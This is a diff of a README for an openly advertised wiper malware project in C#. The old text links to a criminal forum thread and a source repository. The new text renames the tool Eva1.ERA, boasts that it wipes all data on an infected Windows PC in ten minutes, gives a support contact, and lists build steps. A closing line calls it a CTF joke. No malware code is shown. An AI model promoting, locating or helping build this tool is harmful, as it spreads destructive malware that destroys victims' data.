@@ -1,16 +1,16 @@
-# Endurance-Wiper Beta - Open Source
-A small wiper malware written in C# using the .NET framework.
-If you are from Twitter or any other source, you can clearly tell this is in active development.
-You are free to check the updates here.
+# Eva1.ERA
+Eva1.ERA best wiper malware written in C# using the .NET framework available on internet.\
+Eva1.ERA written with significant and abviosly power.
+Eva1.ERA can wipe al data of infected windows-PC at 10 minutes.
 
-https://breached.vc/Thread-active-development-custom-wiper-ransomware
+For support: @yabn3x_team_support
 
 # Requirements
 * Visual Studio 22
   * Visual Studio C# for desktop development package
 
 # Setup
-1. Clone the repository: ```git clone https://github.com/IntelBroker/Endurance-Wiper/```
+1. Clone the repository
 2. Open the downloaded folder.
 3. Open ```Endurance.sln``` with Visual Studio 22
 
@@ -19,3 +19,5 @@ https://breached.vc/Thread-active-development-custom-wiper-ransomware
 2. Right click the solution of the project.
 3. Click "Build"
 4. Output file will be located in /bin/Debug/
+
+p.s. creating for CTF-task purposes, it's a joke :)
